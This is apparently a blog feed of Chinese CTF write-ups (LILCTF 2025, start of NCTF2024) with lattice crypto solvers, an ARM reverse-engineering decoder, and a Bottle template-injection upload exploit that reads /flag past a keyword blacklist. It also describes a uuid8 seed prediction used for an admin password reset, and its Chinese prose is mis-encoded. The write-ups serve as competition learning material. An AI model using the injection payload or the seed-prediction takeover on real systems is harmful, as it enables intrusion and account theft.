<span class="hljs-built_in">range</span>(ncols)] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nrows)]<br>x = [random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">114514</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ncols)]<br><br>b = [<span class="hljs-built_in">sum</span>(A[i][j] * x[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ncols)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nrows)]<br><span class="hljs-built_in">print</span>(A)<br><span class="hljs-built_in">print</span>(b)<br><br>xx = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter your solution: &quot;</span>).strip().split()))<br><span class="hljs-keyword">if</span> xx != x:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh, your linear algebra needs to be practiced.&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Bravo! Here is your flag:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼äºèƒŒåŒ…ï¼Œå‚è€ƒezbagï¼š<a href="https://naby1.github.io/2025/02/12/hgame2025_1/#ezbag">HGAME2025-Crypto - Nabyçš„åšå®¢</a></p><p>å°±å¤šä¹˜ä¸€ä¸ªæ•°ï¼Œå°½é‡å¾—åˆ°æœ€å°å‘é‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ast<br>sh = remote(<span class="hljs-string">&quot;challenge.xinshi.fun&quot;</span>,<span class="hljs-number">47837</span>)<br><br>A=ast.literal_eval(sh.recvline().decode())<br>b=ast.literal_eval(sh.recvline().decode())<br><br>nrows = <span class="hljs-number">16</span><br>ncols = <span class="hljs-number">32</span><br>N=<span class="hljs-number">2</span>**<span class="hljs-number">32</span><br><br>L=Matrix(ZZ,ncols+<span class="hljs-number">1</span>,ncols+nrows)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ncols):<br>    L[i,i]=<span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nrows):<br>        L[i,ncols+j]=A[j][i]*N<br>L[-<span class="hljs-number">1</span>,:]=<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nrows):<br>    L[-<span class="hljs-number">1</span>,ncols+j]=b[j]*N<br>x=L.BKZ()<br><br>x=[(<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(i))+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x[<span class="hljs-number">0</span>][:ncols]]<br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    res+= <span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27; &#x27;</span><br>sh.sendlineafter(<span class="hljs-string">b&#x27;solution: &#x27;</span>,res.encode())<br><span class="hljs-built_in">print</span>(sh.recvall())<br>sh.close()<br></code></pre></td></tr></table></figure><h2 id="baaaaaag"><a class="markdownIt-Anchor" href="#baaaaaag"></a> baaaaaag</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = random.getrandbits(<span class="hljs-number">72</span>)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(p)[<span class="hljs-number">2</span>:]) == <span class="hljs-number">72</span><br><br>a = [getPrime(<span class="hljs-number">90</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">72</span>)]<br>b = <span class="hljs-number">0</span><br>t = p<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    temp = t % <span class="hljs-number">2</span><br>    b += temp * i<br>    t = t &gt;&gt; <span class="hljs-number">1</span><br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;a = <span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;b = <span class="hljs-subst">&#123;b&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext = <span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>å‚è€ƒezbagï¼š<a href="https://naby1.github.io/2025/02/12/hgame2025_1/#ezbag">HGAME2025-Crypto - Nabyçš„åšå®¢</a></p><p>å°±å¤šäº†ä¸ªblock_size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><br>a = <br>b = <br>ciphertext = <br>n=<span class="hljs-number">72</span><br>L=Matrix(ZZ,n+<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    L[i,i]=<span class="hljs-number">2</span><br>    L[i,-<span class="hljs-number">1</span>]=a[-i-<span class="hljs-number">1</span>]<br>L[-<span class="hljs-number">1</span>,:]=<span class="hljs-number">1</span><br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=b<br>x=L.BKZ(block_size=<span class="hljs-number">32</span>)<br>p=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x[<span class="hljs-number">0</span>][:n]:<br>    <span class="hljs-keyword">if</span> i==x[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]:<br>        p+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        p+=<span class="hljs-string">&#x27;0&#x27;</span><br>p=<span class="hljs-built_in">int</span>(p,<span class="hljs-number">2</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = cipher.decrypt(ciphertext)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="æ˜¯è°æ²¡æœ‰é˜…è¯»å‚èµ›é¡»çŸ¥"><a class="markdownIt-Anchor" href="#æ˜¯è°æ²¡æœ‰é˜…è¯»å‚èµ›é¡»çŸ¥"></a> æ˜¯è°æ²¡æœ‰é˜…è¯»å‚èµ›é¡»çŸ¥ï¼Ÿ</h2><p>LILCTF{Me4n1ngFu1_w0rDs}</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="ez_bottle"><a class="markdownIt-Anchor" href="#ez_bottle"></a> ez_bottle</h2><p>ç¨å¾®çœ‹äº†ä¸‹bottleï¼Œå‘ç°è¿™è¿‡æ»¤çš„åŸºæœ¬æ²¡è¿‡æ»¤ï¼Œè®©AIå¿«é€Ÿæ“ä¸ªäº¤äº’è„šæœ¬åï¼Œå‘ç°å¡åœ¨æ€ä¹ˆå›æ˜¾</p><p>æœ€ååœ¨è¿™é‡Œå‘ç°äº†å¯ä»¥è§¦å‘æŠ¥é”™</p><p><a href="https://blog.csdn.net/weixin_59166557/article/details/146161897">https://blog.csdn.net/weixin_59166557/article/details/146161897</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> zipfile<br><br>url = <span class="hljs-string">&quot;http://challenge.xinshi.fun:34182/upload&quot;</span>  <span class="hljs-comment"># æ›¿æ¢ä¸ºç›®æ ‡URL</span><br><br>BLACK_DICT = [<span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;sock&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;bul&quot;</span>, <span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>,<br>               <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;globals&quot;</span>,<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>]<br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¶æ„tplçš„ZIPæ–‡ä»¶</span><br>exp=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">%import io</span><br><span class="hljs-string">%a=io.FileIO(&#x27;/flag&#x27;,&#x27;r&#x27;).read();raise Exception(a)</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.strip()<br><span class="hljs-keyword">for</span> black <span class="hljs-keyword">in</span> BLACK_DICT:<br>    <span class="hljs-keyword">if</span> black <span class="hljs-keyword">in</span> exp:<br>        <span class="hljs-built_in">print</span>(black)<br>        exit()<br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">&quot;1.zip&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> zf:<br>    zf.writestr(<span class="hljs-string">&quot;1.tpl&quot;</span>, exp)<br><br><span class="hljs-comment"># å‡†å¤‡æ¶æ„ZIPæ–‡ä»¶</span><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>), <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#125;<br><br><span class="hljs-comment"># å‘é€ä¸Šä¼ è¯·æ±‚</span><br>response = requests.post(url, files=files)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-comment"># æå–è®¿é—®é“¾æ¥</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;/view/([a-f0-9]&#123;32&#125;)/([^&quot;]+)&#x27;</span>, response.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        md5_hash = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        filename = <span class="hljs-string">&#x27;1.tpl&#x27;</span><br>        exploit_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url.rsplit(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]&#125;</span>/view/<span class="hljs-subst">&#123;md5_hash&#125;</span>/<span class="hljs-subst">&#123;filename&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Exploit URL: <span class="hljs-subst">&#123;exploit_url&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># è§¦å‘æ¼æ´è¯»å–flag</span><br>        flag_response = requests.get(exploit_url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Text:\n<span class="hljs-subst">&#123;flag_response.text&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Failed to extract exploit URL from response&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Response content:&quot;</span>, response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Upload failed (HTTP <span class="hljs-subst">&#123;response.status_code&#125;</span>)&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="ekko_note"><a class="markdownIt-Anchor" href="#ekko_note"></a> *Ekko_note</h2><p>åªåšåˆ°äº†è§£å†³uuid8çš„éƒ¨åˆ†ï¼Œåé¢ä¸ä¼šäº†</p><p>é€šè¿‡å°è¯•æœç´¢ä½ç‰ˆæœ¬pythonçš„uuid8ï¼Œåˆšå¥½å‘ç°æ‹‰é¢ç‰¹å¾å¸ˆå‚…çš„åšå®¢</p><p><img src="/imgs/LILCTF2025/1.png" alt="1" /></p><p>å¾—åˆ°uuid8ç”Ÿæˆä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">uuid8</span>(<span class="hljs-params">a=<span class="hljs-literal">None</span>, b=<span class="hljs-literal">None</span>, c=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Generate a UUID from three custom blocks.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    * &#x27;a&#x27; is the first 48-bit chunk of the UUID (octets 0-5);</span><br><span class="hljs-string">    * &#x27;b&#x27; is the mid 12-bit chunk (octets 6-7);</span><br><span class="hljs-string">    * &#x27;c&#x27; is the last 62-bit chunk (octets 8-15).</span><br><span class="hljs-string"></span><br><span class="hljs-string">    When a value is not specified, a pseudo-random value is generated.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> a <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">import</span> random<br>        a = random.getrandbits(<span class="hljs-number">48</span>)<br>    <span class="hljs-keyword">if</span> b <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">import</span> random<br>        b = random.getrandbits(<span class="hljs-number">12</span>)<br>    <span class="hljs-keyword">if</span> c <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">import</span> random<br>        c = random.getrandbits(<span class="hljs-number">62</span>)<br>    int_uuid_8 = (a &amp; <span class="hljs-number">0xffff_ffff_ffff</span>) &lt;&lt; <span class="hljs-number">80</span><br>    int_uuid_8 |= (b &amp; <span class="hljs-number">0xfff</span>) &lt;&lt; <span class="hljs-number">64</span><br>    int_uuid_8 |= c &amp; <span class="hljs-number">0x3fff_ffff_ffff_ffff</span><br>    <span class="hljs-comment"># by construction, the variant and version bits are already cleared</span><br>    int_uuid_8 |= _RFC_4122_VERSION_8_FLAGS<br>    <span class="hljs-keyword">return</span> UUID._from_int(int_uuid_8)<br></code></pre></td></tr></table></figure><p>aå¯çŸ¥æ˜¯<code>admin\x00</code></p><p>éšæœºæ•°ç§å­æ˜¯å›ºå®šçš„</p><p>ç™»é™†åå¯ä»¥åœ¨<code>/server_info</code> æŸ¥çœ‹åˆ°æœåŠ¡å™¨å¯åŠ¨æ—¶é—´  <code> random.seed(SERVER_START_TIME)</code></p><p><code>_RFC_4122_VERSION_8_FLAGS</code>çš„å€¼æ ¹æ®RFCæ ‡å‡†<a href="https://www.rfc-editor.org/rfc/rfc9562.html#name-example-of-a-uuidv8-value-n">RFC 9562: Universally Unique IDentifiers (UUIDs)</a></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx</span><br></code></pre></td></tr></table></figure><p>Må’ŒNçš„æœ€é«˜ä½éƒ½ä¸º1ï¼Œæ¢ç®—ä¸€ä¸‹å°±å‡ºæ¥äº†</p><p>ç„¶åå°±å¯ä»¥ä¿®æ”¹adminè´¦å·çš„å¯†ç äº†</p><p>åé¢å°±ä¸ä¼šäº†</p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="arm-asm"><a class="markdownIt-Anchor" href="#arm-asm"></a> ARM ASM</h2><p><img src="/imgs/LILCTF2025/2.png" alt="2" /></p><p>æœ‰ä¸‰ä¸ªçœ‹ä¸æ‡‚çš„å‡½æ•°<code>veorq_s8, vqtbl1q_s8, vld1q_dup_s8</code></p><p>é€šè¿‡æœç´¢å¾—çŸ¥è¿™æ˜¯neonæŒ‡ä»¤é›†ï¼Œç®€å•è¯´å°±æ˜¯ï¼š</p><p><code>veorq_s8</code>: å¼‚æˆ–</p><p><code>vqtbl1q_s8</code>: å–å¯¹åº”ç´¢å¼•ä½ç½®çš„å€¼</p><p><code>vld1q_dup_s8</code>:  å°†ä¸€ä¸ªå€¼æ‰©å±•åˆ°ï¼ˆä¸€ä¸ªå¯„å­˜å™¨çš„ï¼‰æ‰€æœ‰é€šé“(?) è¿™é‡Œç†è§£å°±æ˜¯ä¸€ä¸ªæ•°ç»„</p><p>çŸ¥é“è¿™äº›å°±å¾ˆç®€å•äº†</p><p>æ¯”è¾ƒå‘çš„å°±æ˜¯è¿™base64çš„è¡¨ä¸æ˜¯å¸¸è§„è¡¨ï¼Œç”¨cyberChefæ¢ä¸€ä¸‹å°±å¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=<span class="hljs-string">b&#x27;\x92\xb7\x7c\x0b\xbc\x6b\xb2\x39\x7d\x13\xa1\x50\x72\x20\x48\x62\x34\x61\xc3\xb0\x54\xeb\x33\x6d\xca\x35\x72\x5b\xb7\x66\xf2\xb6\x69\x93\xbc\x62\xaa\x33\x67\xf3\x31\x6b\x9b\x2d\x6c\x3b\xaf\x6c&#x27;</span><br>a=<span class="hljs-built_in">bytearray</span>(a)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">3</span>):<br>    a[j]=((a[j]&gt;&gt;<span class="hljs-number">3</span>)|((a[j]&amp;<span class="hljs-number">0x7</span>)&lt;&lt;<span class="hljs-number">5</span>))&amp;<span class="hljs-number">0xff</span><br>    a[j+<span class="hljs-number">1</span>]=((a[j+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">1</span>)|(a[j+<span class="hljs-number">1</span>]&gt;&gt;<span class="hljs-number">7</span>))&amp;<span class="hljs-number">0xff</span><br><br>t=<span class="hljs-built_in">bytes</span>([<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>])<br>t1=<span class="hljs-built_in">bytes</span>([i^<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re_table</span>(<span class="hljs-params">a,t</span>):<br>    a=[a[i]^t[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>    <br>    inv_t=[<span class="hljs-number">0</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        inv_t[t[i]]=i<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([a[inv_t[i]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]).decode()<br><span class="hljs-built_in">print</span>(re_table(a[:<span class="hljs-number">16</span>],t)+re_table(a[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>],t)+re_table(a[<span class="hljs-number">32</span>:],t1))<br><span class="hljs-comment"># LILCTF&#123;ez_arm_asm_meow_meow_meow_meow_meow_meow&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NCTF2024-crypto</title>
    <link href="/2025/03/23/nctf2024/"/>
    <url>/2025/03/23/nctf2024/</url>
    
    <content type="html"><![CDATA[<h1 id="nctf2024-crypto"><a class="markdownIt-Anchor" href="#nctf2024-crypto"></a> NCTF2024-Crypto</h1><p>æ‹¼å°½å…¨åŠ›å°±å†™å‡ºä¸¤é¢˜ï¼Œå·²ç»ä¸æƒ³æ€è€ƒäº†ï¼Œéƒ½ä¸éš¾ï¼Œåªæ˜¯ç»†èŠ‚(æŒ‡æ•°æ®å¤„ç†)æœ‰ç‚¹éº»çƒ¦ã€‚</p><h2 id="sign"><a class="markdownIt-Anchor" href="#sign"></a> sign</h2><h3 id="é¢˜ç›®"><a class="markdownIt-Anchor" href="#é¢˜ç›®"></a> é¢˜ç›®</h3><p><a href="http://srv.py">srv.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> util <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> getenv<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>string = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;secret.txt&#x27;</span>).read().strip().encode()<br>flag = getenv(<span class="hljs-string">&#x27;FLAG&#x27;</span>).encode()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    Keys = []<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> string:<br>        f = FHE()<br>        s = long_to_bytes(Random().getrandbits(<span class="hljs-number">20000</span>))<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s[<span class="hljs-number">4</span>:]:<br>            Keys.extend(f.encrypt([i]))<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s[:<span class="hljs-number">4</span>]:<br>            Keys.extend(f.encrypt([i * (m &amp; <span class="hljs-number">0x03</span>) % <span class="hljs-number">0x101</span>]))<br>            m &gt;&gt;= <span class="hljs-number">2</span><br>        <br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(Keys) == <span class="hljs-number">30000</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] Your ciphertext: <span class="hljs-subst">&#123;AES.new(md5(string).digest(),AES.MODE_ECB).encrypt(pad(flag,<span class="hljs-number">16</span>)).<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;[+] The keys to retrieve the global internet connection are as follows:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30000</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] <span class="hljs-subst">&#123;Keys[i]&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p><a href="http://util.py">util.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 